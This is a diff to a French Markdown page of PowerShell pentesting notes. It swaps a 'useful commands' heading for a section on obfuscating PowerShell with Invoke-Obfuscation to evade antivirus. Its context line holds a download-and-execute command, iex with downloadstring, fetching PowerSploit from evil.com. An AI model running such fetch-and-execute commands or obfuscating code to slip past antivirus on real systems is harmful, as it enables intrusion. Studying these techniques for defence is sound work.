@@ -64,10 +64,10 @@ iex (new-object net.webclient).downloadstring('https://evil.com/powersploit.psd1
 
 Il est très important de comprendre que l'execution policy n'est pas un mécanisme de sécurité ! (Microsoft le dit lui-même)
 
-Commandes utiles
-----------------
+Obfuscation
+-----------
+Il est possible d'obfusquer du code powershell pour contourner certains antivirus qui bloquent powersploit & cie. L'outil [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) permet de faire ceci facilement. Il est cependant possible de bloquer les codes obfusqués (une analyse statistique permet de détecter les codes non légitimes).
 
-Les commandes suivantes sont utiles à connaître lors de l'utilisation de Powershell:
 
 Resources
 ---------
